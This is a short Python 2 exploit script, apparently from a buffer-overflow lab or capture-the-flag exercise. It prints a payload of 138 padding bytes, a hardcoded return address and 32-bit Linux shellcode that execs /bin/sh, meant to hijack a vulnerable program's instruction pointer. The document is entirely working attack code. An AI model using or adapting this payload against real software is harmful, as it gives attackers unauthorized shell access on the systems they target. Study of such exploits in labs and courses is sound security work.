#!/usr/bin/env python2

import sys

# exec /bin/sh
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# Before starting to overwrite the first byte of $eip, there are 138 bytes

def prep_buffer(addr_buffer):
    buf = 'A' * 138
    buf += addr_buffer
    buf += shellcode
    return buf

if __name__ == '__main__':
    	buf = prep_buffer('\xc7\x76\x12\x42') 
    	# I got the previous address from gold-adresses.txt which is generated 
    	# after executing bash-script.sh
    	print buf
